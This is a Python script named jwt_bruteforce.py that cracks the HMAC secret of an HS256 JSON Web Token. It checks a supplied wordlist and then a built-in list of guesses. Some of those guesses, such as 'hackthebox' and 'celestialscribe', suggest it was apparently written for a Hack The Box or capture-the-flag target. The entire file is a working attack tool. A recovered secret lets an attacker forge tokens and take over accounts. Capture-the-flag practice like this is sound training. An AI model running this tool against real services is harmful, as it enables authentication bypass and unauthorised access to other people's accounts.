#!/usr/bin/env python3
import sys, base64, json, hmac, hashlib
from pathlib import Path

def b64url_decode(data: str) -> bytes:
    padding = '=' * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def parse_token(tok: str):
    parts = tok.strip().split('.')
    if len(parts) != 3:
        raise ValueError('Invalid JWT structure')
    header_b, payload_b, sig_b64 = parts
    header = json.loads(b64url_decode(header_b))
    payload = json.loads(b64url_decode(payload_b))
    signing_input = (header_b + '.' + payload_b).encode()
    sig = b64url_decode(sig_b64)
    return header, payload, signing_input, sig, sig_b64

def verify_secret(signing_input: bytes, sig: bytes, secret: str) -> bool:
    expected = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return hmac.compare_digest(expected, sig)

def main():
    if len(sys.argv) < 2:
        print('Usage: jwt_bruteforce.py <token_file> [wordlist]', file=sys.stderr)
        sys.exit(2)
    token = Path(sys.argv[1]).read_text().strip() if Path(sys.argv[1]).exists() else sys.argv[1]
    header, payload, signing_input, sig, _ = parse_token(token)
    if header.get('alg') != 'HS256':
        print('Unsupported alg: {}'.format(header.get('alg')), file=sys.stderr)
        sys.exit(3)
    words = [
        'secret','password','admin','root','123456','qwerty','supersecret','jwtsecret','jwt-secret','secretkey','secret_key',
        'hackthebox','htb','celestial','scribe','celestialscribe','securenotes','notes','android','mobile','token','express','nodejs'
    ]
    if len(sys.argv) >= 3 and Path(sys.argv[2]).exists():
        try:
            with open(sys.argv[2], 'r', errors='ignore') as f:
                for i, line in enumerate(f):
                    w = line.strip()
                    if not w:
                        continue
                    if verify_secret(signing_input, sig, w):
                        print(w)
                        return
                    if i >= 5000:  # cap to 5000 words initially
                        break
        except Exception:
            pass
    for w in words:
        if verify_secret(signing_input, sig, w):
            print(w)
            return
    sys.exit(1)

if __name__ == '__main__':
    main()
